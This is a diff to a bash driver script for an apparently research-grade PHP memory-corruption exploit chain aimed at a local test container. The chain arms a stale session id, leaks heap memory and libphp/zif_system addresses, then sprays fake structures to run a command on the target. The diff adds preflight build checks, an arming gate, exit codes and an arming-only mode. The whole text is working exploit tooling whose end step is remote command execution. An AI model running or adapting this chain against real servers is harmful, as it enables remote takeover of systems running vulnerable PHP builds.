@@ -9,10 +9,15 @@
 # Steps: A1 arms the stale session id, B1 discloses 800 KB out of the recycled chunk, leak_addrs
 # turns that into libphp/main/S/hsv, A2 re-arms with the cheap OOM, B2 sprays the fake reference and
 # the fake array. The proof is a command run by the target's user, written through the container.
+#
+# Exit codes: 0 chain verified and the proof file was read
+#             2 preflight refused the target, or a step failed
+#             5 preflight says the build arms but cannot disclose (8.5.11)
+#             6 --allow-arming-only: the gate passed and the run stopped there on purpose
 set -u
 
 TARGET="http://127.0.0.1:18110/index.php"
-CONTAINER="${CONTAINER:-p2s-target}"
+CONTAINER="${CONTAINER:-${NAME:-p2s-target}}"
 CMD='id>/tmp/pwn.txt'
 PROOF="/tmp/pwn.txt"
 SPEC="G:511:0x137*14,G:400:0x137,X:900"
@@ -21,6 +26,11 @@ DEPTH=64
 FILLERS=115
 WORKERS=0          # >1: hold WORKERS-1 connections so every step lands on the same child
 SYMBOLS=""         # empty = resolve from the image's own symbol table (portable across builds/arches)
+PROBE=""           # path of a deployed probe.php, an input to the preflight
+SKIP_PREFLIGHT=0
+ALLOW_UNVERIFIED=0 # gate: continue when A1 died but no container log is available
+ALLOW_ARMING_ONLY=0 # preflight: accept an arming-only build (8.5.11) and stop after the gate
+STOP_AFTER_GATE=0   # implied by --allow-arming-only
 
 while [ $# -gt 0 ]; do
   case "$1" in
@@ -33,13 +43,19 @@ while [ $# -gt 0 ]; do
     --fillers) FILLERS="$2"; shift 2 ;;
     --workers) WORKERS="$2"; shift 2 ;;
     --symbols) SYMBOLS="$2"; shift 2 ;;
+    --probe) PROBE="$2"; shift 2 ;;
+    --skip-preflight) SKIP_PREFLIGHT=1; shift ;;
+    --allow-unverified) ALLOW_UNVERIFIED=1; shift ;;
+    --allow-arming-only) ALLOW_ARMING_ONLY=1; STOP_AFTER_GATE=1; shift ;;
     *) echo "unknown argument $1" >&2; exit 2 ;;
   esac
 done
 
 HERE="$(cd "$(dirname "$0")" && pwd)"
 COOKIE=$(mktemp)
+A1OUT=""
 HOLDER=""
+
 
 # Fail before the first stage rather than after it: four requests against nothing produce four
 # confusing errors, and the interesting one is always the first.
@@ -52,6 +68,29 @@ try:
 except OSError as exc:
     sys.exit("no target on %s (%s)" % (url, exc.strerror or exc))
 ' "$TARGET" || exit 1
+
+# Answer the cheap compatibility questions before spending the body: the chain is tied to one build
+# family and one SAPI, and anything else fails in the middle in a way that reads like a broken exploit.
+if [ "$SKIP_PREFLIGHT" = 1 ]; then
+  echo "preflight: skipped"
+else
+  PF_ARGS=(--url "$TARGET")
+  [ -n "$PROBE" ] && PF_ARGS+=(--probe "$PROBE")
+  [ "$ALLOW_ARMING_ONLY" = 1 ] && PF_ARGS+=(--allow-arming-only)
+  python3 "$HERE/preflight.py" "${PF_ARGS[@]}"
+  PF_RC=$?
+  if [ "$PF_RC" = 5 ]; then
+    # Arming reproduces here, disclosure does not, so a chain run can only fail at B1. That is worth
+    # knowing on purpose -- it is how the arming instrument is validated -- but not by accident.
+    echo "[!] this build arms but cannot disclose: B1 has nothing to leak" >&2
+    echo "    re-run with --allow-arming-only to verify the arming instrument and stop after the gate," >&2
+    echo "    or with --skip-preflight to try the whole chain anyway" >&2
+    exit 5
+  elif [ "$PF_RC" != 0 ]; then
+    echo "[!] preflight failed - re-run with --skip-preflight to try anyway" >&2
+    exit 2
+  fi
+fi
 
 # Every offset in this chain is a property of one binary, so nothing here is hardcoded: the symbols are
 # read out of the image that is actually running (zif_system is not exported, so the full symbol table is
@@ -72,7 +111,8 @@ if [ -z "$SYMBOLS" ]; then
       }')
 fi
 if [ -z "$SYMBOLS" ]; then
-  echo "warning: could not read symbols from $CONTAINER; falling back to the arm64 defaults" >&2
+  echo "warning: could not read symbols from $CONTAINER; falling back to the arm64 8.4.26 offsets" >&2
+  echo "         (pass --symbols name=0xoff,... for any other arch or build)" >&2
 fi
 SYM_ARGS=()
 if [ -n "$SYMBOLS" ]; then
@@ -85,7 +125,7 @@ fi
 echo "symbols: ${SYMBOLS:-<arm64 defaults>}"
 
 cleanup() {
-  rm -f "$COOKIE"
+  rm -f "$COOKIE" "$A1OUT"
   if [ -n "$HOLDER" ]; then
     kill "$HOLDER" 2>/dev/null
     wait "$HOLDER" 2>/dev/null
@@ -99,8 +139,27 @@ if [ "$WORKERS" -gt 1 ]; then
   sleep 3
 fi
 
+# A1 output is kept in a file: the gate needs the whole thing (status, OOM text, socket outcome), not
+# a two-line preview. The log timestamp slices the container log to this run so an older OOM line
+# cannot be mistaken for this one.
+A1OUT=$(mktemp)
+A1SINCE=$(date -u +%Y-%m-%dT%H:%M:%SZ)
 python3 "$HERE/a1_arm.py" --url "$TARGET" --repeat 1 --sid-hex 00 --big 78 \
-        --query-n 5 --query-len 1 --timeout 120 | grep -E '^  attempt |VERDICT' | head -2
+        --query-n 5 --query-len 1 --timeout 120 > "$A1OUT"
+grep -E '^  attempt |socket:|tried to allocate' "$A1OUT" | head -3
+
+GATE_ARGS=(--a1-output "$A1OUT" --since "$A1SINCE")
+[ -n "$CONTAINER" ] && GATE_ARGS+=(--container "$CONTAINER")
+[ "$ALLOW_UNVERIFIED" = 1 ] && GATE_ARGS+=(--allow-unverified)
+python3 "$HERE/arming_gate.py" "${GATE_ARGS[@]}" || exit $?
+
+if [ "$STOP_AFTER_GATE" = 1 ]; then
+  echo
+  echo "stopping after the gate: this build is expected to arm and not to disclose."
+  echo "The arming instrument is verified; B1, A2 and B2 were not attempted."
+  echo "exit 6 means 'as expected for this build', not 'the chain worked'."
+  exit 6
+fi
 sleep 1
 
 python3 "$HERE/b1_forge.py" --url "$TARGET" --spec "$SPEC" --fake-len 0xC8000 \
